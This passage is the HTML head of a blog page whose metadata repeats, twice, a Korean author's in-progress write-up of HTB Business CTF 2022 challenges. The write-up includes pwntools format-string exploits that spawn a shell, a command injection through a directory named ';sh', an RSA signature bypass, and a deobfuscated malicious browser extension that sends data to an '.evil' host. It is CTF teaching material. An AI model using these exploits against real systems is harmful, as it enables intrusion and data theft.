<!DOCTYPE html>
<html lang="en" class="html" data-theme="dark"><head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>
    
      HTB Business CTF 2022 : Dirty Money write-up (in progress)
    
  </title>

  <!-- Begin Jekyll SEO tag v2.7.3 -->
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="HTB Business CTF 2022 : Dirty Money write-up (in progress)" />
<meta name="author" content="Ainsetin" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Write-up IN PROGRESS .. 작성중 Summary Solved 3 pwn (including windows kernel exploitation), 3 crypto, 2 rev, 1 forensic. pwn focused on FSB attack or ezpz kernel exploitation. RSA, elgamel simple attack in crypto. and etc.. Tasks Pwnable💻 Payback Insider OpenDoor Cryptography💡 BBGun06 (+ revenge) ElElGamal Reversing⚙️ BreakOut ChromeMiner, Assisted Forensic🔎 Lina’s Invitation PWN : Payback 1. Analyze mitigations are here: [*] &#39;/mnt/c/Users/bww96/Desktop/CTF_2022/htb_business/pwn/pwn_payback/challenge/payback&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b&#39;./.glibc/&#39; I found that delete_bot function has Format string bug when I send delete_reason. int delete_bot() { unsigned int id; id = getId(); // 0 ~ 31 if (botBuf[id].url != NULL) { char reasonbuf[MAX_REASON_SIZE]; memset(reasonbuf, &#39;\x00&#39;, MAX_REASON_SIZE); // gather statistics printf(&quot;\n[*] Enter the reason of deletion: &quot;); read(STDIN_FILENO, &amp;reasonbuf, MAX_REASON_SIZE - 1); free(botBuf[id].url); botBuf[id].url = NULL; puts(&quot;\n[+] Bot Deleted successfully! | Reason: &quot;); printf(reasonbuf); return 0; } puts(&quot;\n[!] Error: Unable to fetch the requested bot entry.\n&quot;); } reasonbuf is in a stack area so I can check FSB attack offset with input buffer. If I manage __free_hook, I can call system(&quot;/bin/sh\x00&quot;) when I call delete_bot. Setting bot’s URL to /bin/sh\x00 and calling free can trigger shell. Let’s exploit! 2. Exploit Code from pwn import * # p=process(&quot;./payback&quot;) p=remote(&quot;142.93.37.110&quot;,30669) e=ELF(&quot;./payback&quot;) l=ELF(&quot;.glibc/libc.so.6&quot;) def add(): p.sendlineafter(&quot;&gt;&gt; &quot;, str(1).encode()) p.sendlineafter(&quot;: &quot;, &quot;/bin/sh\x00&quot;) p.sendlineafter(&quot;: &quot;, &quot;0&quot;) def delete(id, fsb_pay): p.sendlineafter(&quot;&gt;&gt; &quot;, str(3)) p.sendlineafter(&quot;: &quot;, str(id)) pause() p.sendafter(&quot;: &quot;, fsb_pay) add() delete(0, &quot;%p&quot;) # overwrite offset : 8 p.recvuntil(&quot;Reason: \n&quot;) libc_base = int(p.recv(14),16) - 0x1ed723 free_hook = libc_base + l.sym[&#39;__free_hook&#39;] system = libc_base + l.sym[&#39;system&#39;] log.info(hex(libc_base)) log.info(hex(free_hook)) add() low = system &amp; 0xffff mid = (system &gt;&gt; 16) &amp; 0xffff high = system &gt;&gt; 32 if mid &gt; low: rmid = mid-low else: rmid = 0x10000+mid-low if high &gt; mid: rhigh = high-mid else: rhigh = 0x10000+high-mid log.info(hex(low)) log.info(hex(mid)) log.info(hex(high)) payload = &#39;&#39; payload += &#39;%{}c&#39;.format(low) payload += &#39;%13$hn&#39; payload += &#39;%{}c&#39;.format(rmid) payload += &#39;%14$hn&#39; payload += &#39;%{}c&#39;.format(rhigh) payload += &#39;%15$hn&#39; payload += &#39;A&#39; payload = payload.encode() #print(len(payload)) payload += p64(free_hook) payload += p64(free_hook + 2) payload += p64(free_hook + 4) delete(0, payload) add() delete(0, b&quot;pwned&quot;) p.interactive() Flag is HTB{w3_sHoulD_1n1t1at3_a_bug_bounty_pr0gram}. PWN : Insider 1. Analyze Binary run FTP cli program with 30 commands. USER ;) : compare with ;) string, if it’s correct, prepare PASS command. PASS ;) : same with USER command, if password correct, I can use all of cmds. BKDR [payload] : short expression of backdoor I think, it can be attacked by FSB with limited condition. LIST : get current working directory (CWD) by using getcwd() function. also run ls -al [result of getcwd()] with popen. if process run successfully, result should be written in console. CWD [path] : change working directory with my own path. MKDR [path] : make directory with my own path. .. etc BKDR command can leak stack area or overwrite stack area. I found unchanged stack position that makes denied access to LIST command. (value : -1, LIST NOT ALLOWED!) at first, I used RETR command to read /flag.txt, but this file’s permission is only read in root, r--------. Need to find another way.. v131 should be more than 0, so if I found right offset of v131, can be overwritten by %[offset]$n. 2. After Getting shell..? MKDR ;sh : make directory named ;sh. it’s legal expression in linux. CWD ;sh : change working directory to /home/ctf/;sh LIST : call getcwd() =&gt; /home/ctf/;sh and combine string (result : ls -al /home/ctf/;sh) !!!SHELL EXECUTED!!! In the shell, cd /home/ctf =&gt; I noticed that get_flag file’s RUNPATH is ./, so changing working directory to /home/ctf is necessary. In the shell, ./get_flag =&gt; Execute! In the shell, exit =&gt; for receiving results of entire commands. (because commands is running in popen process) 3. Exploit Code from pwn import * #context.log_level = &#39;debug&#39; p = remote(&quot;104.248.175.153&quot;,30467) #p = process(&#39;./chall&#39;) def qwer(x, noRecv=False): if not noRecv: p.recv() p.send(x) sleep(0.5) qwer(&quot;USER ;)&quot;) qwer(&quot;PASS ;)&quot;) qwer(&quot;BKDR %p %p %p %p %p %p %p&quot;) p.recvuntil(&quot;(nil) 0x&quot;) leak = int(p.recv(12), 16) + 0x66c0 log.info(hex(leak)) pay = b&#39;BKDR&#39; pay += b&#39; %1035$n&#39; #pause() pay = pay.ljust(0x28-3, b&#39;b&#39;) pay += p64(leak) pay += b&quot;ASDF&quot; qwer(pay) #qwer(&quot;STOR .profile&quot;) #qwer(&quot;alias ls=&#39;sh;ls&#39;&quot;.ljust(0x1000, &#39;a&#39;) + &#39;LIST&#39;, True) #p.shutdown(&#39;send&#39;) qwer(&quot;MKDR ;sh&quot;) qwer(&quot;CWD ;sh&quot;) qwer(&quot;LIST&quot;) p.sendline(&quot;cd /home/ctf&quot;) p.sendline(&quot;./get_flag&quot;) p.sendline(&quot;exit&quot;) p.interactive() Flag is HTB{Private_Key_H@McQfTjWnZr4u7x!A%D*G-KaNdRgUkX}. PWN : OpenDoor ! REDACTED ! Exploit Code : https://gist.github.com/bww9641/b55628e52157fd04beb25155c951beeb CRYPTO : BBGun06 1. Analyze BBGun06 / revenge has same verify(self,message, signature) code: def verify(self, message, signature): keylength = len(long_to_bytes(self.n)) decrypted = self.encrypt(signature) clearsig = decrypted.to_bytes(keylength, &quot;big&quot;) r = re.compile(b&#39;\x00\x01\xff+?\x00(.{15})(.{20})&#39;, re.DOTALL) m = r.match(clearsig) if not m: raise VerificationError(&#39;Verification failed&#39;) if m.group(1) != self.asn1: raise VerificationError(&#39;Verification failed&#39;) if m.group(2) != sha1(message).digest(): raise VerificationError(&#39;Verification failed&#39;) return True And en/decrypt function changes signature code(byte) to long by using bytes_to_long to calculate with integer. Decrypted message is same when I give bytes string that has same integer result. That means, dec(&quot;0001&quot;) == dec(&quot;01&quot;). It’s simple! send given signature with 00 :D, 00 + sig revenge prob has the same solving process lol:) See below. 2. Exploit (Manual) // for_BBGun06 signature: 59b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10 ... // for_BBGun06 revenge Enter the signature as hex: 0059b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10 HTB{8131ch3n84ch32&#39;06_519n47u23_f02932y} signature: 866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f ... Enter the signature as hex: 00866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f HTB{1t_w@s_5upp0s3d_to_b3_8131ch3n84ch32&#39;s} CRYPTO : ElElGamal I didn’t know about ElGamal in cryptography, so I searched a lot. writing… — REV : BreakOut 1. FLAG Recovering Connect URL:port/proc/self/maps and see what prob should be the base program. /bkd is running! Download bkd file in website. Realize it’s web server made by C++. Find secretGet function and get flag. 2. Get FLAG Flag is HTB{th3_pr0c_f5_15_4_p53ud0_f1l35y5t3m_wh1ch_pr0v1d35_4n_1nt3rf4c3.....}. REV : ChromeMiner Fully obfuscated js Challenge. 1. Recover with hand async function iF() { if (!(&#39;injected&#39; in document)) { document[&#39;injected&#39;] = true; window[&#39;setInterval&#39;](async () =&gt; { y = new window[&#39;Uint8Array&#39;](64); window[&#39;crypto&#39;][&#39;getRandomValues&#39;](y); if (new window[&#39;TextDecoder&#39;](&#39;utf-8&#39;)[&#39;decode&#39;](await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;digest&#39;](&#39;sha-256&#39;, y))[&#39;endsWith&#39;](&#39;chrome&#39;)) { j = new window[&#39;Uint8Array&#39;](y[&#39;byteLength&#39;] + (await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;digest&#39;](&#39;sha-256&#39;, y))[&#39;byteLength&#39;]); j[&#39;set&#39;](new window[&#39;Uint8Array&#39;](y), 0); j[&#39;set&#39;](new window[&#39;Uint8Array&#39;](await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;digest&#39;](&#39;sha-256&#39;, y)), y[&#39;byteLength&#39;]); window[&#39;fetch&#39;](&#39;hxxps://qwertzuiop123.evil/&#39; + [...new window[&#39;Uint8Array&#39;](await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;encrypt&#39;]({[&#39;name&#39;]: &#39;AES-CBC&#39;, [&#39;iv&#39;]: new window[&#39;TextEncoder&#39;](&#39;utf-8&#39;)[&#39;encode&#39;](&#39;_NOT_THE_SECRET_&#39;)}, await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;importKey&#39;](&#39;raw&#39;, await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;decrypt&#39;]({[&#39;name&#39;]: &#39;AES-CBC&#39;, [&#39;iv&#39;]: new window[&#39;TextEncoder&#39;](&#39;utf-8&#39;)[&#39;encode&#39;](&#39;_NOT_THE_SECRET_&#39;)}, await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;importKey&#39;](&#39;raw&#39;, new window[&#39;TextEncoder&#39;](&#39;utf-8&#39;)[&#39;encode&#39;](&#39;_NOT_THE_SECRET_&#39;), {[&#39;name&#39;]: &#39;AES-CBC&#39;}, true, [&#39;decrypt&#39;]), new window[&#39;Uint8Array&#39;]((&#39;E242E64261D21969F65BEDF954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8&#39;)[&#39;match&#39;](/../g)[&#39;map&#39;](h =&gt; window[&#39;parseInt&#39;](h, 16)))), {[&#39;name&#39;]: &#39;AES-CBC&#39;}, true, [&#39;encrypt&#39;]), j))][&#39;map&#39;](x =&gt; x[&#39;toString&#39;](16)[&#39;padStart&#39;](2, &quot;0&quot;))[&#39;join&#39;](&quot;&quot;)); } }, 1); } } ; chrome[&#39;tabs&#39;][&#39;onUpdated&#39;][&#39;addListener&#39;]((tabVar, changeInfo, tab) =&gt; { if (&#39;url&#39; in tab &amp;&amp; tab[&#39;url&#39;] != null &amp;&amp; (tab[&#39;url&#39;][&#39;startsWith&#39;](&#39;https://&#39;) || tab[&#39;url&#39;][&#39;startsWith&#39;](&#39;http://&#39;))) { chrome[&#39;scripting&#39;][&#39;executeScript&#39;]({[&#39;target&#39;]: {[&#39;tabId&#39;]: tab[&#39;id&#39;]}, function: iF}); } }); 2. Decrypt with AES-256 &gt;&gt;&gt; from Crypto.Cipher import AES &gt;&gt;&gt; AES.new(b&#39;_NOT_THE_SECRET_&#39;,AES.MODE_CBC,b&#39;_NOT_THE_SECRET_&#39;) &lt;Crypto.Cipher.AES.AESCipher object at 0x7fae19feb790&gt; &gt;&gt;&gt; cipher = AES.new(b&#39;_NOT_THE_SECRET_&#39;,AES.MODE_CBC,b&#39;_NOT_THE_SECRET_&#39;) &gt;&gt;&gt; cipher.decrypt(b&#39;\xe2B\xe6Ba\xd2\x19i\xf6[\xed\xf9T\x90\n\x99R\t\t\x9f\xb6\xc3\xc6\x82\xc0\xd9\xc4\xb2u\xb1\xc2\x12\xbc\x18\x8e\x08\x82\xb6\xber\xc7I!\x12A\x18\x7f\xa8&#39;) b&#39;HTB{__mY_vRy_owN_CHR0me_M1N3R__}\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10&#39; FOR : Lina’s Invitation writing…." />
<meta property="og:description" content="Write-up IN PROGRESS .. 작성중 Summary Solved 3 pwn (including windows kernel exploitation), 3 crypto, 2 rev, 1 forensic. pwn focused on FSB attack or ezpz kernel exploitation. RSA, elgamel simple attack in crypto. and etc.. Tasks Pwnable💻 Payback Insider OpenDoor Cryptography💡 BBGun06 (+ revenge) ElElGamal Reversing⚙️ BreakOut ChromeMiner, Assisted Forensic🔎 Lina’s Invitation PWN : Payback 1. Analyze mitigations are here: [*] &#39;/mnt/c/Users/bww96/Desktop/CTF_2022/htb_business/pwn/pwn_payback/challenge/payback&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b&#39;./.glibc/&#39; I found that delete_bot function has Format string bug when I send delete_reason. int delete_bot() { unsigned int id; id = getId(); // 0 ~ 31 if (botBuf[id].url != NULL) { char reasonbuf[MAX_REASON_SIZE]; memset(reasonbuf, &#39;\x00&#39;, MAX_REASON_SIZE); // gather statistics printf(&quot;\n[*] Enter the reason of deletion: &quot;); read(STDIN_FILENO, &amp;reasonbuf, MAX_REASON_SIZE - 1); free(botBuf[id].url); botBuf[id].url = NULL; puts(&quot;\n[+] Bot Deleted successfully! | Reason: &quot;); printf(reasonbuf); return 0; } puts(&quot;\n[!] Error: Unable to fetch the requested bot entry.\n&quot;); } reasonbuf is in a stack area so I can check FSB attack offset with input buffer. If I manage __free_hook, I can call system(&quot;/bin/sh\x00&quot;) when I call delete_bot. Setting bot’s URL to /bin/sh\x00 and calling free can trigger shell. Let’s exploit! 2. Exploit Code from pwn import * # p=process(&quot;./payback&quot;) p=remote(&quot;142.93.37.110&quot;,30669) e=ELF(&quot;./payback&quot;) l=ELF(&quot;.glibc/libc.so.6&quot;) def add(): p.sendlineafter(&quot;&gt;&gt; &quot;, str(1).encode()) p.sendlineafter(&quot;: &quot;, &quot;/bin/sh\x00&quot;) p.sendlineafter(&quot;: &quot;, &quot;0&quot;) def delete(id, fsb_pay): p.sendlineafter(&quot;&gt;&gt; &quot;, str(3)) p.sendlineafter(&quot;: &quot;, str(id)) pause() p.sendafter(&quot;: &quot;, fsb_pay) add() delete(0, &quot;%p&quot;) # overwrite offset : 8 p.recvuntil(&quot;Reason: \n&quot;) libc_base = int(p.recv(14),16) - 0x1ed723 free_hook = libc_base + l.sym[&#39;__free_hook&#39;] system = libc_base + l.sym[&#39;system&#39;] log.info(hex(libc_base)) log.info(hex(free_hook)) add() low = system &amp; 0xffff mid = (system &gt;&gt; 16) &amp; 0xffff high = system &gt;&gt; 32 if mid &gt; low: rmid = mid-low else: rmid = 0x10000+mid-low if high &gt; mid: rhigh = high-mid else: rhigh = 0x10000+high-mid log.info(hex(low)) log.info(hex(mid)) log.info(hex(high)) payload = &#39;&#39; payload += &#39;%{}c&#39;.format(low) payload += &#39;%13$hn&#39; payload += &#39;%{}c&#39;.format(rmid) payload += &#39;%14$hn&#39; payload += &#39;%{}c&#39;.format(rhigh) payload += &#39;%15$hn&#39; payload += &#39;A&#39; payload = payload.encode() #print(len(payload)) payload += p64(free_hook) payload += p64(free_hook + 2) payload += p64(free_hook + 4) delete(0, payload) add() delete(0, b&quot;pwned&quot;) p.interactive() Flag is HTB{w3_sHoulD_1n1t1at3_a_bug_bounty_pr0gram}. PWN : Insider 1. Analyze Binary run FTP cli program with 30 commands. USER ;) : compare with ;) string, if it’s correct, prepare PASS command. PASS ;) : same with USER command, if password correct, I can use all of cmds. BKDR [payload] : short expression of backdoor I think, it can be attacked by FSB with limited condition. LIST : get current working directory (CWD) by using getcwd() function. also run ls -al [result of getcwd()] with popen. if process run successfully, result should be written in console. CWD [path] : change working directory with my own path. MKDR [path] : make directory with my own path. .. etc BKDR command can leak stack area or overwrite stack area. I found unchanged stack position that makes denied access to LIST command. (value : -1, LIST NOT ALLOWED!) at first, I used RETR command to read /flag.txt, but this file’s permission is only read in root, r--------. Need to find another way.. v131 should be more than 0, so if I found right offset of v131, can be overwritten by %[offset]$n. 2. After Getting shell..? MKDR ;sh : make directory named ;sh. it’s legal expression in linux. CWD ;sh : change working directory to /home/ctf/;sh LIST : call getcwd() =&gt; /home/ctf/;sh and combine string (result : ls -al /home/ctf/;sh) !!!SHELL EXECUTED!!! In the shell, cd /home/ctf =&gt; I noticed that get_flag file’s RUNPATH is ./, so changing working directory to /home/ctf is necessary. In the shell, ./get_flag =&gt; Execute! In the shell, exit =&gt; for receiving results of entire commands. (because commands is running in popen process) 3. Exploit Code from pwn import * #context.log_level = &#39;debug&#39; p = remote(&quot;104.248.175.153&quot;,30467) #p = process(&#39;./chall&#39;) def qwer(x, noRecv=False): if not noRecv: p.recv() p.send(x) sleep(0.5) qwer(&quot;USER ;)&quot;) qwer(&quot;PASS ;)&quot;) qwer(&quot;BKDR %p %p %p %p %p %p %p&quot;) p.recvuntil(&quot;(nil) 0x&quot;) leak = int(p.recv(12), 16) + 0x66c0 log.info(hex(leak)) pay = b&#39;BKDR&#39; pay += b&#39; %1035$n&#39; #pause() pay = pay.ljust(0x28-3, b&#39;b&#39;) pay += p64(leak) pay += b&quot;ASDF&quot; qwer(pay) #qwer(&quot;STOR .profile&quot;) #qwer(&quot;alias ls=&#39;sh;ls&#39;&quot;.ljust(0x1000, &#39;a&#39;) + &#39;LIST&#39;, True) #p.shutdown(&#39;send&#39;) qwer(&quot;MKDR ;sh&quot;) qwer(&quot;CWD ;sh&quot;) qwer(&quot;LIST&quot;) p.sendline(&quot;cd /home/ctf&quot;) p.sendline(&quot;./get_flag&quot;) p.sendline(&quot;exit&quot;) p.interactive() Flag is HTB{Private_Key_H@McQfTjWnZr4u7x!A%D*G-KaNdRgUkX}. PWN : OpenDoor ! REDACTED ! Exploit Code : https://gist.github.com/bww9641/b55628e52157fd04beb25155c951beeb CRYPTO : BBGun06 1. Analyze BBGun06 / revenge has same verify(self,message, signature) code: def verify(self, message, signature): keylength = len(long_to_bytes(self.n)) decrypted = self.encrypt(signature) clearsig = decrypted.to_bytes(keylength, &quot;big&quot;) r = re.compile(b&#39;\x00\x01\xff+?\x00(.{15})(.{20})&#39;, re.DOTALL) m = r.match(clearsig) if not m: raise VerificationError(&#39;Verification failed&#39;) if m.group(1) != self.asn1: raise VerificationError(&#39;Verification failed&#39;) if m.group(2) != sha1(message).digest(): raise VerificationError(&#39;Verification failed&#39;) return True And en/decrypt function changes signature code(byte) to long by using bytes_to_long to calculate with integer. Decrypted message is same when I give bytes string that has same integer result. That means, dec(&quot;0001&quot;) == dec(&quot;01&quot;). It’s simple! send given signature with 00 :D, 00 + sig revenge prob has the same solving process lol:) See below. 2. Exploit (Manual) // for_BBGun06 signature: 59b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10 ... // for_BBGun06 revenge Enter the signature as hex: 0059b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10 HTB{8131ch3n84ch32&#39;06_519n47u23_f02932y} signature: 866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f ... Enter the signature as hex: 00866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f HTB{1t_w@s_5upp0s3d_to_b3_8131ch3n84ch32&#39;s} CRYPTO : ElElGamal I didn’t know about ElGamal in cryptography, so I searched a lot. writing… — REV : BreakOut 1. FLAG Recovering Connect URL:port/proc/self/maps and see what prob should be the base program. /bkd is running! Download bkd file in website. Realize it’s web server made by C++. Find secretGet function and get flag. 2. Get FLAG Flag is HTB{th3_pr0c_f5_15_4_p53ud0_f1l35y5t3m_wh1ch_pr0v1d35_4n_1nt3rf4c3.....}. REV : ChromeMiner Fully obfuscated js Challenge. 1. Recover with hand async function iF() { if (!(&#39;injected&#39; in document)) { document[&#39;injected&#39;] = true; window[&#39;setInterval&#39;](async () =&gt; { y = new window[&#39;Uint8Array&#39;](64); window[&#39;crypto&#39;][&#39;getRandomValues&#39;](y); if (new window[&#39;TextDecoder&#39;](&#39;utf-8&#39;)[&#39;decode&#39;](await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;digest&#39;](&#39;sha-256&#39;, y))[&#39;endsWith&#39;](&#39;chrome&#39;)) { j = new window[&#39;Uint8Array&#39;](y[&#39;byteLength&#39;] + (await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;digest&#39;](&#39;sha-256&#39;, y))[&#39;byteLength&#39;]); j[&#39;set&#39;](new window[&#39;Uint8Array&#39;](y), 0); j[&#39;set&#39;](new window[&#39;Uint8Array&#39;](await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;digest&#39;](&#39;sha-256&#39;, y)), y[&#39;byteLength&#39;]); window[&#39;fetch&#39;](&#39;hxxps://qwertzuiop123.evil/&#39; + [...new window[&#39;Uint8Array&#39;](await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;encrypt&#39;]({[&#39;name&#39;]: &#39;AES-CBC&#39;, [&#39;iv&#39;]: new window[&#39;TextEncoder&#39;](&#39;utf-8&#39;)[&#39;encode&#39;](&#39;_NOT_THE_SECRET_&#39;)}, await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;importKey&#39;](&#39;raw&#39;, await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;decrypt&#39;]({[&#39;name&#39;]: &#39;AES-CBC&#39;, [&#39;iv&#39;]: new window[&#39;TextEncoder&#39;](&#39;utf-8&#39;)[&#39;encode&#39;](&#39;_NOT_THE_SECRET_&#39;)}, await window[&#39;crypto&#39;][&#39;subtle&#39;][&#39;importKey&#39;](&#39;raw&#39;, new window[&#39;TextEncoder&#39;](&#39;utf-8&#39;)[&#39;encode&#39;](&#39;_NOT_THE_SECRET_&#39;), {[&#39;name&#39;]: &#39;AES-CBC&#39;}, true, [&#39;decrypt&#39;]), new window[&#39;Uint8Array&#39;]((&#39;E242E64261D21969F65BEDF954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8&#39;)[&#39;match&#39;](/../g)[&#39;map&#39;](h =&gt; window[&#39;parseInt&#39;](h, 16)))), {[&#39;name&#39;]: &#39;AES-CBC&#39;}, true, [&#39;encrypt&#39;]), j))][&#39;map&#39;](x =&gt; x[&#39;toString&#39;](16)[&#39;padStart&#39;](2, &quot;0&quot;))[&#39;join&#39;](&quot;&quot;)); } }, 1); } } ; chrome[&#39;tabs&#39;][&#39;onUpdated&#39;][&#39;addListener&#39;]((tabVar, changeInfo, tab) =&gt; { if (&#39;url&#39; in tab &amp;&amp; tab[&#39;url&#39;] != null &amp;&amp; (tab[&#39;url&#39;][&#39;startsWith&#39;](&#39;https://&#39;) || tab[&#39;url&#39;][&#39;startsWith&#39;](&#39;http://&#39;))) { chrome[&#39;scripting&#39;][&#39;executeScript&#39;]({[&#39;target&#39;]: {[&#39;tabId&#39;]: tab[&#39;id&#39;]}, function: iF}); } }); 2. Decrypt with AES-256 &gt;&gt;&gt; from Crypto.Cipher import AES &gt;&gt;&gt; AES.new(b&#39;_NOT_THE_SECRET_&#39;,AES.MODE_CBC,b&#39;_NOT_THE_SECRET_&#39;) &lt;Crypto.Cipher.AES.AESCipher object at 0x7fae19feb790&gt; &gt;&gt;&gt; cipher = AES.new(b&#39;_NOT_THE_SECRET_&#39;,AES.MODE_CBC,b&#39;_NOT_THE_SECRET_&#39;) &gt;&gt;&gt; cipher.decrypt(b&#39;\xe2B\xe6Ba\xd2\x19i\xf6[\xed\xf9T\x90\n\x99R\t\t\x9f\xb6\xc3\xc6\x82\xc0\xd9\xc4\xb2u\xb1\xc2\x12\xbc\x18\x8e\x08\x82\xb6\xber\xc7I!\x12A\x18\x7f\xa8&#39;) b&#39;HTB{__mY_vRy_owN_CHR0me_M1N3R__}\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10&#39; FOR : Lina’s Invitation writing…." />
<link rel="canonical" href="https://ainset.in//htb-businessctf-2022.html" />
<meta property="og:url" content="https://ainset.in//htb-businessctf-2022.html" />
<meta property="og:site_name" content="Ainsetin 🇰🇷 ⚡" />
<meta property="og:image" content="https://soopr.xyz/images/card?url=https://ainset.in//htb-businessctf-2022.html" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-07-18T17:30:00+09:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="og:image" content="https://soopr.xyz/images/card?url=https://ainset.in//htb-businessctf-2022.html" />
<meta property="twitter:title" content="HTB Business CTF 2022 : Dirty Money write-up (in progress)" />
<meta name="twitter:site" content="@ainsetin" />
<meta name="twitter:creator" content="@Ainsetin" />
<script type="application/ld+json">
